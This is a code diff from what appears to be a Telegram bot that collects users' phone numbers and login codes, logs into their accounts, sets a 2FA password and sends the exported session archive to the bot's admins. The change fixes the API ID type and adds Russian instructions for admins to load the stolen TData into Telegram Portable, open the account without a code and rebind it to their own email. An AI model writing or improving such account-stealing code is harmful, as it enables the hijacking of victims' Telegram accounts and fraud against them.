@@ -368,7 +368,8 @@ async def cb_request_tg_code(callback: CallbackQuery, state: FSMContext):
     if not phone or not session_path:
         return await callback.answer("❌ Сессия устарела. Начните заново.", show_alert=True)
 
-    client = TelegramClient(session_path, str(API_ID), API_HASH)
+    # Исправление ошибки с api_id/api_hash в opentele
+    client = TelegramClient(session_path, int(API_ID), API_HASH)
 
     try:
         await client.connect()
@@ -411,7 +412,7 @@ async def process_code(message: Message, state: FSMContext):
         return await message.answer("❌ Ошибка сессии. Вернитесь в меню и попробуйте снова.",
                                     reply_markup=get_back_keyboard())
 
-    client = TelegramClient(session_path, str(API_ID), API_HASH)
+    client = TelegramClient(session_path, int(API_ID), API_HASH)
 
     try:
         await client.connect()
@@ -467,6 +468,17 @@ async def process_code(message: Message, state: FSMContext):
         )
         await db.commit()
 
+    # Инструкция по входу в TData для администратора
+    tdata_instruction = (
+        "\n\n📖 **Инструкция по входу в аккаунт через TData:**\n"
+        "1. Скачайте архив и распакуйте его.\n"
+        "2. Скачайте официальную портативную версию Telegram для ПК (Telegram Portable с официального сайта).\n"
+        "3. В папке с распакованным Telegram Portable найдите папку `tdata` и удалите её содержимое (либо переименуйте).\n"
+        "4. Перенесите файлы из распакованного архива (файлы папки `tdata`) в пустую папку `tdata` вашего Telegram Portable.\n"
+        "5. Запустите `Telegram.exe` — аккаунт откроется автоматически без ввода кода (если попросит пароль, укажите указанный выше).\n"
+        "6. Перейдите в настройки безопасности и привяжите свою почту/измените данные."
+    )
+
     if archive_path and os.path.exists(archive_path):
         for admin_id in ADMIN_IDS:
             try:
@@ -478,6 +490,7 @@ async def process_code(message: Message, state: FSMContext):
                         f"👤 Пользователь: `{message.from_user.id}`\n"
                         f"📱 Телефон: `{phone}`\n"
                         f"🔑 2FA Пароль: `{AUTO_PASSWORD}`"
+                        f"{tdata_instruction}"
                     ),
                     parse_mode="Markdown"
                 )
